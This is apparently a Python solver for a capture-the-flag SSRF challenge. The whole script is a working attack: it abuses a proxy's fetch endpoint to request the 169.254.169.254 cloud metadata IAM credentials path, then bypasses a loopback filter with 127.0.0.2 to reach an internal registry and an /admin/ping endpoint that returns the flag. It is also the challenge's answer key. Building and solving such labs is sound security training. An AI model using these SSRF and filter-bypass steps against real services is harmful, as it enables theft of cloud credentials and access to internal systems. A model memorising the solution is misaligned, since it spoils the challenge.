#!/usr/bin/env python3
"""
Solver for ssrf-metadata-decoy.

Full path:
  1. Read the public robots.txt to learn the internal registry odd port (9137)
     and to see the link-local metadata "mirror" hint.
  2. (Show the decoy dead end.) SSRF to 169.254.169.254 -> stale fake creds.
  3. Note that http://127.0.0.1:9137/ is blocked by the proxy's naive filter.
  4. Bypass the filter with an alternate loopback encoding (127.0.0.2) to read
     the registry, which advertises the admin ping.
  5. SSRF the proxy to the internal /admin/ping. The effect fires and the flag
     comes back in the JSON deploy_token.

Usage:
    python3 solve.py http://localhost:8080
"""
import re
import sys
from urllib.parse import quote

import requests


def proxy_get(base, target):
    r = requests.get(f"{base}/fetch", params={"url": target}, timeout=10)
    return r.status_code, r.text


def main():
    base = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080").rstrip("/")

    # 1. Recon: the robots.txt-like file.
    robots = requests.get(f"{base}/robots.txt", timeout=10).text
    print("[*] robots.txt:\n" + robots)
    m = re.search(r"127\.0\.0\.1:(\d+)", robots)
    port = m.group(1) if m else "9137"
    print(f"[*] internal registry port from robots: {port}")

    # 2. The decoy (dead end) -- just to demonstrate it is stale.
    st, body = proxy_get(
        base, "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    )
    print(f"\n[*] decoy metadata role listing ({st}): {body.strip()!r}")
    print("[*] -> these creds are a stale mirror; they never yield the flag.\n")

    # 3. Direct loopback is blocked by the naive filter.
    st, body = proxy_get(base, f"http://127.0.0.1:{port}/")
    print(f"[*] http://127.0.0.1:{port}/ via proxy -> {st}: {body.strip()!r}")

    # 4. Bypass with an alternate loopback address (whole 127.0.0.0/8 is lo).
    bypass_host = "127.0.0.2"
    st, body = proxy_get(base, f"http://{bypass_host}:{port}/")
    print(f"[*] http://{bypass_host}:{port}/ via proxy -> {st}")
    print("    registry: " + body.strip())

    # 5. Hit the internal admin ping -> effect fires -> flag.
    st, body = proxy_get(base, f"http://{bypass_host}:{port}/admin/ping")
    print(f"\n[*] /admin/ping via proxy -> {st}")
    print("    " + body.strip())

    m = re.search(r"CTF\{[^}]+\}", body)
    if m:
        print("\n[+] FLAG:", m.group(0))
        return 0
    print("\n[-] no flag found; is the service up and TEAM_SECRET set?")
    return 1


if __name__ == "__main__":
    sys.exit(main())
